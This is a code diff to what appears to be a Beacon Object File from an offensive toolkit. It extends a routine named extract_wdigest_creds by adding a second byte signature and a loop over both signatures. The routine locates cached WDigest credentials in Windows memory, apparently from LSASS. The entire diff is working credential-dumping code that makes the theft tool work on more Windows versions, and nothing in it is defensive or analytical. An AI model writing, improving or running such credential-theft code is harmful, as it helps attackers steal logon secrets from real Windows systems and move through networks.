@@ -1,6 +1,13 @@
 #include "../include/common_bof.h"
 
-static const uint8_t WDIGEST_SIG[] = { 0x48, 0x3b, 0xd9, 0x74 };
+static const uint8_t WDIGEST_SIG_0[] = { 0x48, 0x3b, 0xd9, 0x74 };
+static const uint8_t WDIGEST_SIG_1[] = { 0x48, 0x3b, 0xc8, 0x74 };
+
+typedef struct { const uint8_t* pat; uint32_t len; } WdSig;
+static const WdSig WDIGEST_SIGS[] = {
+    { WDIGEST_SIG_0, sizeof(WDIGEST_SIG_0) },
+    { WDIGEST_SIG_1, sizeof(WDIGEST_SIG_1) },
+};
 
 static ModuleInfo find_wdigest_module(HANDLE h, uint64_t dtb,
                                        uint64_t ep, uint32_t peb_off) {
@@ -36,9 +43,11 @@ WDigestList extract_wdigest_creds(HANDLE h, uint64_t dtb,
 
     const uint8_t* text_raw = dll.data + text.raw_offset;
     uint32_t sig_off = 0;
-    for (uint32_t i = 4; i + sizeof(WDIGEST_SIG) <= text.raw_size; i++) {
-        if (memcmp(text_raw + i, WDIGEST_SIG, sizeof(WDIGEST_SIG)) == 0) {
-            sig_off = i; break;
+    for (size_t s = 0; s < sizeof(WDIGEST_SIGS)/sizeof(WDIGEST_SIGS[0]) && !sig_off; s++) {
+        for (uint32_t i = 4; i + WDIGEST_SIGS[s].len <= text.raw_size; i++) {
+            if (memcmp(text_raw + i, WDIGEST_SIGS[s].pat, WDIGEST_SIGS[s].len) == 0) {
+                sig_off = i; break;
+            }
         }
     }
 
